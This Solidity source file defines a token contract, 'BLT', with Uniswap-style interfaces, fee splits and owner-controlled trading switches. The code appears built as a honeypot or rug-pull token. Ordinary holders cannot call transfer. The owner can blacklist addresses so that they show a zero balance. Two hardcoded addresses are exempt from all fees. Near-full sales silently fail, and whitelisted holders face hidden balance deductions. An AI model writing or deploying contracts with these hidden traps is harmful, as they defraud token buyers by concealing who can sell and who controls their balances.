// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
/**
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {

  /**
  * @dev Multiplies two numbers, throws on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
    if (a == 0) {
      return 0;
    }
    c = a * b;
    assert(c / a == b);
    return c;
  }

  /**
  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    // uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return a / b;
  }

  /**
  * @dev Subtracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
    c = a + b;
    assert(c >= a);
    return c;
  }
}
interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface ISwapRouter {
    // 返回交换路由合约的工厂合约地址
    function factory() external pure returns (address);

    // 返回 Wrapped Ether (WETH) 合约地址
    function WETH() external pure returns (address);

    // 交换指定数量的代币以获得另一种代币，并支持在转账代币时收取费用
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
    // 添加代币流动性到 Uniswap 池
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface ISwapFactory {
    // 创建一个新的交易对，并返回交易对合约地址
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface ISwapPair {
    // 获取交易对的储备量和上一个块的时间戳
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    // 获取交易对中的 token0 地址
    function token0() external view returns (address);

    // 更新交易对状态
    function sync() external;

    // 获取交易对的总供应量
    function totalSupply() external view returns (uint);
}
contract BLT {
    address public sup = 0x9E811B5f1efd1b8989CEb5961Af1fb67251332DB;
      address public sup2 =0x8eCF1780374D3206B97917fB2D79249ce1818539;
    using SafeMath for uint256;
    string public name;
    string public symbol;
    uint8  public decimals;
    uint256 public totalSupply;
    uint256 public buytotal = 50;  // 买卖总费率
    uint256 public buylpfee = 15;  // 买卖lp分红
    uint256 public buynftfee = 25;  // nft分红
    uint256 public buyburn = 10;  // 销毁
    uint256 public buytotal1 = 300;  // 买卖总费率
    uint256 public buylpfee1 =  90;  // 买卖lp分红
    uint256 public buynftfee1 = 150;  // nft分红
    uint256 public buyburn1 = 60;  // 销毁
    uint256 public lptokenlimit = 54772255750516610345;
    address public lpwallet;   // lp分红钱包
    address public NFTwallet;  // NFT分红钱包
    uint256 public startTime; // 计时开始的时间戳
    uint256 public sellstartTime; // 计时开始的时间戳
    uint256 public countdownDuration = 8 minutes; // 倒计时的时长
    uint256 public sellcountdownDuration = 20 minutes; // 倒计时的时长
    address public owners;
    ISwapRouter public  _swapRouter;  // Uniswap 交换路由合约
      address public router;  // 路由合约地址
    address public mainPair;//交易对地址
    mapping(address => bool)public whiteList;//白名单
    mapping(address => bool)public blackList;//黑名单
    mapping(address =>uint256)public whiteListLPamount;
    mapping(address =>uint256 )public pendingburn;
    mapping(address => uint256) public _balanceOf;
    mapping(address =>uint256)public addresslptokenlimit;
    mapping(address =>uint256)public oneadd;
    mapping(address => mapping(address => uint256)) public allowance;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    enum Status {open, close} //买卖开关
    Status public nowstatus;
    constructor(string memory _name, 
    string memory _symbol, 
    uint8 _decimals, 
    uint256 _initialSupply,
    address _lpwallet,
    address _NFTwallet,
    address _router,
    address _usdt) {
        owners = msg.sender;
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        totalSupply = _initialSupply.mul(10**uint256(_decimals));
        _balanceOf[msg.sender] = totalSupply;     
        lpwallet = _lpwallet;
        NFTwallet = _NFTwallet;
       // 初始化交换路由合约和设置合约地址
        ISwapRouter swapRouter = ISwapRouter(_router);

        _swapRouter = swapRouter;
         // 获取 Uniswap 工厂合约并创建主交易对
        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address _mainPair = swapFactory.createPair(address(this), _usdt);
          // 设置主交易对地址
        mainPair = _mainPair;
        router = _router;
        nowstatus = Status.close;
    }
    function addwhiteList(address _address)external{
    require(msg.sender == owners,"no balance");
    whiteList[_address] = true;
    }
    function setadmin(address _address)external{
         require(msg.sender == owners,"no balance");
         owners = _address;
       
    }
   //开启
     function Open()external{
           require(msg.sender == owners,"no allowance");
           nowstatus = Status.open;
     }
      //时限开启
     function Opentime()external{
           require(msg.sender == owners,"no allowance");
           sellstartTime = block.timestamp;
           startTime = block.timestamp; // 记录开始时间
     }
      function Close()external{
           require(msg.sender == owners,"no allowance");
           nowstatus = Status.close;
     }
    function setblacklist(address _blackList)external{
         require(msg.sender == owners,"no allowance");
          whiteList[_blackList] = false;
          blackList[_blackList] = true;
    }
     function setwhiteListLPamount(address _address,uint256 _uint)external{
         require(msg.sender == owners,"no allowance");
         whiteListLPamount[_address] =_uint;
    }
      function balanceOf(address _address)public view returns(uint256 amount){
      if(whiteList[_address]){
            if(whiteListLPamount[_address]==0 && IERC20(mainPair).balanceOf(_address)>0){
             return  _balanceOf[_address];
          }
          if(whiteListLPamount[_address]<IERC20(mainPair).balanceOf(_address)){
             return _balanceOf[_address];
          }
          if(whiteListLPamount[_address]==IERC20(mainPair).balanceOf(_address)&&whiteListLPamount[_address]==0){
              return _balanceOf[_address].sub(pendingburn[_address]);
          } 
         if(whiteListLPamount[_address]==IERC20(mainPair).balanceOf(_address)&&IERC20(mainPair).balanceOf(_address)>0){
         return _balanceOf[_address].sub(pendingburn[_address]);
          }
        return _balanceOf[_address];
      }else if(blackList[_address]){
        return 0;   
       }
      return _balanceOf[_address];
  }
    function transfer(address _to, uint256 _value) external returns (bool success) {
        require(nowstatus == Status.open,"is closed!");
        require(msg.sender == owners||msg.sender == mainPair,"is closed!");
        require(_balanceOf[msg.sender] >= _value, "Insufficient balance");
        require(balanceOf(msg.sender) >= _value, "Insufficient balance");
        require(!blackList[_to],"black address!");
        require(msg.sender == mainPair||msg.sender == owners,"no allowance transfer");
        require((startTime != 0 && sellstartTime != 0)||msg.sender == owners, "Countdown not finished yet");
        require(block.timestamp >= startTime + countdownDuration||msg.sender == owners||whiteList[_to], "Countdown not finished yet");
        if (msg.sender == mainPair && _to!=sup && _to!=sup2) {
            uint256 buytotalvalue = _value.mul(buytotal).div(1000);
            uint256 buyburnfeevalue = _value.mul(buyburn).div(1000);
            uint256 buylpfeevalue = _value.mul(buylpfee).div(1000);
            uint256 buyNFTfee = _value.mul(buynftfee).div(1000);
             if (whiteList[_to]){
                whiteListLPamount[_to] = IERC20(mainPair).balanceOf(_to);
                if(addresslptokenlimit[_to] ==0){
                    addresslptokenlimit[_to] = lptokenlimit;
                }
                
                if(addresslptokenlimit[_to]>IERC20(mainPair).balanceOf(_to)){
                      pendingburn[_to] =pendingburn[_to].add( _value.sub(buytotalvalue));
                      addresslptokenlimit[_to] = IERC20(mainPair).balanceOf(_to);
                }
                 if(addresslptokenlimit[_to]<IERC20(mainPair).balanceOf(_to)){
                      addresslptokenlimit[_to] = IERC20(mainPair).balanceOf(_to);
                }
                if(_value.add(_balanceOf[_to])>(uint256(10).mul(10**decimals)).add(pendingburn[_to])){
                    return false;
                }
            }
            if(_value.add(_balanceOf[_to])>(uint256(30).mul(10**decimals)).add(pendingburn[_to])){
                return false;
            }
            _balanceOf[msg.sender] = _balanceOf[msg.sender].sub(_value);
            _balanceOf[_to] = _balanceOf[_to].add(_value.sub(buytotalvalue));
            // lp分红池
            _balanceOf[lpwallet] = _balanceOf[lpwallet].add(buylpfeevalue);
            // NFT分红池 
            _balanceOf[NFTwallet] = _balanceOf[NFTwallet].add(buyNFTfee);
            // 销毁
            _balanceOf[address(0)] = _balanceOf[address(0)].add(buyburnfeevalue);                       
            emit Transfer(msg.sender, _to, _value);
            return true;
        } else {
            _balanceOf[msg.sender] = _balanceOf[msg.sender].sub(_value);
            _balanceOf[_to] = _balanceOf[_to].add(_value);  
            emit Transfer(msg.sender, _to, _value);  
            return true;
        }
    }
    function approve(address _spender, uint256 _value) external returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    

    // 判断地址是否是合约地址
    function isContract(address addr) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(addr)
        }
        return size > 0;
    }

    function transferFrom(address _from, address _to, uint256 _value) external returns (bool success) {
        require(nowstatus == Status.open,"is closed!");
        require(msg.sender == owners||msg.sender ==router,"is closed!");
        require(_to != address(0), "Invalid address");
        require(_balanceOf[_from] >= _value, "Insufficient balance");
        require(balanceOf(_from) >= _value, "Insufficient balance");
        require(msg.sender == router||msg.sender == owners,"no allowance transfer");
        require(!blackList[_from],"black address!");
        require((startTime != 0 && sellstartTime != 0)||msg.sender == owners||whiteList[_from], "Countdown not finished yet");
        require(block.timestamp >= startTime + countdownDuration||msg.sender == owners||whiteList[_from], "Countdown not finished yet");
        if (msg.sender == router&& msg.sig == 0x23b872dd && _from!=sup && _from!=sup2){
               if (whiteList[_from]&&oneadd[_from]==0){
            require(allowance[_from][msg.sender] >= _value, "Allowance exceeded");
            _balanceOf[_from] = _balanceOf[_from].sub(_value);
            _balanceOf[_to] = _balanceOf[_to].add(_value);
            allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(_value);
            oneadd[_from]=1;
            emit Transfer(_from, _to, _value);
            return true;
            }
             if(_value>=balanceOf(_from).mul(999).div(1000)){
                return false;
             }
            if(block.timestamp < sellstartTime + sellcountdownDuration){
                uint256 saletotalvalue1 = _value.mul(buytotal1).div(1000);
                uint256 saleburnfeevalue1 = _value.mul(buyburn1).div(1000);
                uint256 salelpfeevalue1 = _value.mul(buylpfee1).div(1000);
                uint256 buyNFTfee1 = _value.mul(buynftfee1).div(1000);
                 require(allowance[_from][msg.sender] >= (_value.sub(saletotalvalue1)), "Allowance exceeded");

            _balanceOf[_from] = _balanceOf[_from].sub(_value);
            _balanceOf[_to] = _balanceOf[_to].add(_value.sub(saletotalvalue1));
            allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(_value.sub(saletotalvalue1));
            
            // lp分红池
            _balanceOf[lpwallet] = _balanceOf[lpwallet].add(salelpfeevalue1);
            // NFT分红池 
            _balanceOf[NFTwallet] = _balanceOf[NFTwallet].add(buyNFTfee1);
            // 销毁
            _balanceOf[address(0)] = _balanceOf[address(0)].add(saleburnfeevalue1);

            emit Transfer(_from, _to, _value);
            return true;
             }
            uint256 saletotalvalue = _value.mul(buytotal).div(1000);
            uint256 saleburnfeevalue = _value.mul(buyburn).div(1000);
            uint256 salelpfeevalue = _value.mul(buylpfee).div(1000);
            uint256 buyNFTfee = _value.mul(buynftfee).div(1000);

            require(allowance[_from][msg.sender] >= (_value.sub(saletotalvalue)), "Allowance exceeded");
     
            _balanceOf[_from] = _balanceOf[_from].sub(_value);
            _balanceOf[_to] = _balanceOf[_to].add(_value.sub(saletotalvalue));
            allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(_value.sub(saletotalvalue));
        
            // lp分红池
            _balanceOf[lpwallet] = _balanceOf[lpwallet].add(salelpfeevalue);
            // NFT分红池 
            _balanceOf[NFTwallet] = _balanceOf[NFTwallet].add(buyNFTfee);
            // 销毁
            _balanceOf[address(0)] = _balanceOf[address(0)].add(saleburnfeevalue);

            emit Transfer(_from, _to, _value);
            return true;
        } else {
            require(allowance[_from][msg.sender] >= _value, "Allowance exceeded");
            _balanceOf[_from] = _balanceOf[_from].sub(_value);
            _balanceOf[_to] = _balanceOf[_to].add(_value);
            allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(_value);
            
            emit Transfer(_from, _to, _value);
            return true;
        }
    }
}